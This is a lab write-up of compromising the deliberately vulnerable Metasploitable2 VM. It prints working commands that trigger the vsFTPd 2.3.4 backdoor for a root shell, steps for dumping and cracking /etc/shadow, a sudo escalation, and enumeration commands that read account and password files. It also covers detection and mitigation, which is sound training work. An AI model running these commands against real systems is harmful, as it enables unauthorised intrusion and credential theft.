---
layout: default
title: Metasploitable2 Full Compromise
---

# Metasploitable2 — Full Compromise: Backdoor Exploitation & Credential-Based Privilege Escalation

**Target:** Metasploitable2 (`10.10.10.X`)
**Attacker:** Kali Linux
**Network:** Isolated virtual lab (VirtualBox)
**Techniques:** CVE exploitation, offline password cracking, credential reuse, sudo misconfiguration abuse

## Objective

Compromise a deliberately vulnerable Linux machine via two independent, chained paths to root, and document why each one works — not just that it works.

## Summary

1. **Exploit path** — a known backdoor in vsFTPd 2.3.4 (CVE-2011-2523) provides an instant, unauthenticated root shell.
2. **Credential path** — loot recovered via the exploit (`/etc/shadow`) is cracked offline, producing valid SSH credentials that lead to root through a sudo misconfiguration.

The goal of documenting both: an exploit gets you in once, on that specific vulnerable service. Valid credentials let you return through the front door indefinitely, indistinguishable from a legitimate user in the logs. That distinction is the core lesson of this exercise.

## Tools

Nmap · Telnet · Netcat · John the Ripper · SSH · Linux CLI

## Attack Chain

```
Recon (Nmap, FTP banner)
   ↓
Exploit vsFTPd 2.3.4 backdoor → instant root
   ↓
Loot /etc/shadow
   ↓
Offline cracking (John)
   ↓
Valid SSH credentials
   ↓
sudo misconfiguration → root (2nd path)
```

## Recon

Initial scanning identified vsFTPd 2.3.4 running on port 21. Anonymous FTP login was used to confirm the service was reachable and to positively identify the version banner before touching anything else — version strings drive exploit selection.

## Exploitation — CVE-2011-2523

CVE-2011-2523 is not a code vulnerability — it's a maliciously inserted backdoor. Between the source release and its discovery, an attacker compromised the vsFTPd 2.3.4 distribution and shipped a trojanized build. Sending a `:)` in the FTP `USER` field silently triggers it: the server opens a raw root shell on TCP 6200 for a very short window.

Because vsFTPd runs as root to manage file permissions for all FTP users, the backdoor shell inherits root immediately — there is no privilege escalation step involved, it's root from the first command.

**Exploitation required two terminals due to the timing-critical window:**

```bash
# Terminal 1 — arm the backdoor
telnet 10.10.10.X 21
USER backdoor:)
# do not send PASS yet

# Terminal 2 — position at the door before firing
nc 10.10.10.X 6200
# leave waiting

# Terminal 1 — fire it
PASS anything

# Terminal 2 — shell lands
id
# uid=0(root) gid=0(root)
```

With root access confirmed, `/etc/shadow` was pulled for offline analysis. All seven user hashes used the `$1$` (MD5-crypt) prefix — a fast, weak algorithm by modern standards, flagged immediately as a high-value cracking target.

## Offline Password Cracking

```bash
john hashes.txt
# no wordlist specified — John's built-in default list was sufficient
```

6 of 7 hashes fell to John's smallest built-in wordlist, without needing rockyou.txt:

| Account | Result | Method |
|---|---|---|
| service, user, msfadmin, postgres | Password identical to username | Single mode |
| klog | Weak numeric password | Default wordlist |
| sys | Common dictionary word | Default wordlist |
| root | Not cracked | Survived basic wordlist attack |

The four username-as-password accounts were caught by John's single mode alone — before any wordlist was even loaded. That's the cheapest check an attacker can run, and it succeeded on over half the accounts on the box.

## Credential-Based Access & Privilege Escalation

Cracked credentials were used to authenticate over SSH. The connection initially failed due to the server's legacy host key algorithms being rejected by a modern SSH client by default:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@10.10.10.X
```

Once authenticated, a `sudo` misconfiguration provided an immediate, trivial escalation path:

```bash
sudo -l
# (ALL:ALL) ALL

sudo su
# root
```

The account had unrestricted sudo rights with a password identical to the username — a misconfiguration pattern common in default/service accounts that are never hardened post-deployment.

## Post-Exploitation Enumeration

Standard situational-awareness sweep after gaining a foothold:

```bash
ps aux                              # process/service enumeration
df -h                                # filesystem layout
cat /etc/passwd                      # account enumeration
find / -name "password*" 2>/dev/null # credential/sensitive file hunting
```

This surfaced additional application-layer credential files tied to web applications hosted on the box — a separate attack surface outside the scope of this writeup.

## Detection

**Backdoor path:** the FTP `USER` field containing non-standard characters (`:)`) is an anomalous pattern an IDS signature could flag directly. More reliably, process ancestry monitoring (auditd, EDR) would catch `vsftpd` spawning a shell as root — a legitimate FTP daemon has no reason to fork `/bin/sh`. Unexpected inbound connections to port 6200 are themselves a strong indicator, since nothing on this host should legitimately listen there.

**Credential path:** repeated SSH authentication attempts followed by a success from an unfamiliar source, especially against a rarely-used account like `msfadmin`, should stand out in auth logs. The `sudo su` invocation immediately after login is also a loggable, alertable event — a fresh login followed instantly by a full-privilege sudo command is a pattern worth a detection rule on its own.

## Mitigation

**Backdoor path:** verify package checksums/signatures before installing any third-party binary distribution — this backdoor only worked because the compromised build went unverified. Beyond that, don't run network-facing services as root where avoidable; if vsFTPd had been sandboxed or run under a restricted user, the backdoor shell would have inherited that restriction instead of root.

**Credential path:** the `$1$` (MD5-crypt) hash format should be replaced with a modern algorithm (`$6$`/SHA-512 or better). Enforce a password policy that rejects username-as-password outright. Sudoers entries should specify exact permitted commands rather than `ALL:ALL` — least privilege would have stopped this escalation cold even with the credentials compromised.

## What I Learned

- A backdoor and a vulnerability are distinct concepts: this was deliberately malicious code shipped in a public release, not an accidental bug.
- Services running as root turn any code-execution flaw in that service into instant root — no additional escalation chain required.
- `username == password` is the cheapest possible credential check and succeeded on 4 of 7 accounts on this host.
- Weak hashing algorithm and weak passwords compound each other: either alone might survive scrutiny, but together they fail in seconds.
- Credential-based access is materially stealthier than exploit-based access — it authenticates like a normal login.
- `sudo -l` should be the first command run in any new shell; it reveals immediately whether privilege escalation is trivial.

## References

- [CVE-2011-2523 — vsftpd 2.3.4 Backdoor](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)

---
*Lab environment — Metasploitable2, an intentionally vulnerable VM used for education. All IPs shown are placeholders.*

[← Back to Projects](/projects.html)
